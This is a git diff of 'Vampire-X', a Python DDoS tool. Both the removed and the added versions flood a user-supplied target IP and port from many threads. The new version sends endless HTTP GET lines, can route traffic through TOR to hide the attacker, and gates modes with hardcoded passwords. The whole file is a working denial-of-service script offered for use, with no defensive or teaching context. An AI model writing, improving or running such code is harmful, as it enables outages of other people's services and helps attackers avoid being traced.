@@ -1,102 +1,111 @@
 import os
 import sys
-import socket
-import threading
 import time
-import random
-import socks  # PySocks for TOR proxy
+import socket
+import socks
+import threading
 import subprocess
+from colorama import Fore, Style, init
 
-# Ensure required modules
-required_modules = ["socks", "requests"]
-for module in required_modules:
-    try:
-        __import__(module)
-    except ImportError:
-        os.system(f"pip install {module}")
+init(autoreset=True)
 
-# ========== Advanced Banner System ==========
-def show_banner(mode):
-    banner = f"""
-{'='*50}
-   Vampire-X {'Admin Panel' if mode == 'admin' else 'User Panel'}
-   Mode: {'Administrator Access' if mode == 'admin' else 'User Access'}
-   Status: ACTIVE | Anonymous Mode: ENABLED
-   Coded by: Muhammad Shourov(Vampire)
-{'='*50}
-"""
-    print(banner)
+# Admin & TOR Credentials
+ADMIN_PASSWORD = "SH404"
+TOR_PASSWORD = "SH404"
 
-# ========== TOR Integration ==========
-def start_tor():
-    print("[+] Initializing TOR for anonymous routing...")
-    try:
-        # Start TOR service (Linux only)
-        subprocess.call("service tor start", shell=True)
-        time.sleep(3)
-        socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
-        socket.socket = socks.socksocket
-        print("[+] TOR routing active.")
-    except Exception as e:
-        print(f"[!] TOR error: {e}. Trying without TOR...")
+# Colorful Banner Functions
+def admin_banner():
+    print(Fore.RED + Style.BRIGHT + """
+███████╗██╗░░░██╗██████╗░███╗░░░███╗██████╗░██╗███╗░░██╗███████╗██╗
+██╔════╝╚██╗░██╔╝██╔══██╗████╗░████║██╔══██╗██║████╗░██║██╔════╝╚═╝
+█████╗░░░╚████╔╝░██████╦╝██╔████╔██║██████╦╝██║██╔██╗██║█████╗░░░░░
+██╔══╝░░░░╚██╔╝░░██╔══██╗██║╚██╔╝██║██╔══██╗██║██║╚████║██╔══╝░░░░░
+███████╗░░░██║░░░██████╦╝██║░╚═╝░██║██████╦╝██║██║░╚███║███████╗██╗
+╚══════╝░░░╚═╝░░░╚═════╝░╚═╝░░░░░╚═╝╚═════╝░╚═╝╚═╝░░╚══╝╚══════╝╚═╝
+                      Vampire-X Admin Panel
+""" + Style.RESET_ALL)
 
-# ========== DDoS Attack Function ==========
-def tcp_flood(target, port, threads):
-    packet = random._urandom(1024)
-    print(f"[TCP] Attack started on {target}:{port} with {threads} threads")
-    
-    def attack():
-        while True:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(1)
-                s.connect((target, port))
-                for _ in range(100):
-                    s.send(packet)
-                s.close()
-                print(f"[TCP] Packet sent to {target}:{port}")
-            except Exception as e:
-                print(f"[!] Error: {e}")
-                pass
+def user_banner():
+    print(Fore.CYAN + Style.BRIGHT + """
+██    ██ ██████  ██████  ██    ██ ██ ██████  ███████     ██
+██    ██ ██   ██ ██   ██ ██    ██ ██ ██   ██ ██          ██
+██    ██ ██████  ██████  ██    ██ ██ ██   ██ █████       ██
+██    ██ ██      ██      ██    ██ ██ ██   ██ ██
+ ██████  ██      ██       ██████  ██ ██████  ███████     ██
+               Vampire-X User Panel
+""" + Style.RESET_ALL)
 
-    for _ in range(threads):
-        t = threading.Thread(target=attack)
-        t.daemon = True
-        t.start()
+# Tor Setup
+def setup_tor():
+    print(Fore.YELLOW + "[+] Initializing TOR for anonymous routing...")
+    tor_check = subprocess.run(['which', 'tor'], capture_output=True, text=True)
+    if tor_check.returncode != 0:
+        print(Fore.YELLOW + "[*] Installing TOR...")
+        os.system("pkg install tor -y")
+    torrc_path = os.path.expanduser("~/.torrc")
+    if not os.path.exists(torrc_path):
+        with open(torrc_path, 'w') as f:
+            f.write("SOCKSPort 9050\n")
+    os.system("tor &")
+    time.sleep(5)
+    print(Fore.GREEN + "[+] TOR routing active.")
 
-# ========== Main Function ==========
+# Attack Function
+def attack(target, port, thread_count, use_tor):
+    def ddos():
+        try:
+            s = socks.socksocket()
+            if use_tor:
+                s.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
+            s.connect((target, port))
+            while True:
+                s.sendto(b"GET / HTTP/1.1\r\n", (target, port))
+        except Exception as e:
+            print(Fore.RED + f"[!] Error: {e}")
+    print(Fore.GREEN + f"[TCP] Attack started on {target}:{port} with {thread_count} threads")
+    for _ in range(thread_count):
+        threading.Thread(target=ddos).start()
+
+# Main Flow
 def main():
-    try:
-        mode = input("Enter mode (admin/user): ").strip().lower()
-        if mode == 'admin':
-            password = input("Enter admin password: ")
-            if password != "SH404":
-                print("Incorrect password. Exiting.")
-                return
-            show_banner("admin")
-            tor_pass = input("Enter TOR password to enable anonymity: ")
-            if tor_pass == "SH404":
-                start_tor()
-            else:
-                print("Invalid TOR password. Proceeding without TOR.")
+    os.system("clear")
+    mode = input(Fore.MAGENTA + "[?] Enter Mode (admin/user): ").strip().lower()
+    if mode == "admin":
+        passwd = input(Fore.YELLOW + "[!] Enter Admin Password: ")
+        if passwd != ADMIN_PASSWORD:
+            print(Fore.RED + "[X] Incorrect password!")
+            sys.exit()
+        admin_banner()
+    elif mode == "user":
+        user_banner()
+    else:
+        print(Fore.RED + "[X] Invalid Mode!")
+        return
+
+    anon = input(Fore.MAGENTA + "[?] Enable Anonymous Mode? (y/n): ").strip().lower()
+    use_tor = False
+    if anon == 'y':
+        tor_pass = input(Fore.YELLOW + "[!] Enter TOR password to enable anonymity: ")
+        if tor_pass == TOR_PASSWORD:
+            setup_tor()
+            use_tor = True
         else:
-            show_banner("user")
-            start_tor()
+            print(Fore.RED + "[X] Incorrect TOR password!")
+            return
 
-        target = input("Enter Target IP: ")
-        port = int(input("Enter Target Port: "))
-        threads = int(input("Enter Threads: "))
-
-        tcp_flood(target, port, threads)
-        while True:
-            time.sleep(1)
-
-    except KeyboardInterrupt:
-        print("\n[!] Attack stopped by user.")
+    try:
+        target = input(Fore.CYAN + "[+] Enter Target IP: ")
+        port = int(input("[+] Enter Target Port: "))
+        threads = int(input("[+] Enter Threads: "))
+        attack(target, port, threads, use_tor)
     except Exception as e:
-        print(f"[!] Fatal Error: {str(e)} — Retrying in safe mode...")
-        time.sleep(2)
-        main()  # Restart
+        print(Fore.RED + f"[!] Critical Error: {e}")
+        print(Fore.YELLOW + "[*] Attempting auto-fix...")
+        time.sleep(1)
+        os.system("pip install -r requirements.txt || pip install socks colorama")
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(Fore.YELLOW + "\n[!] Script interrupted by user. Exiting...")
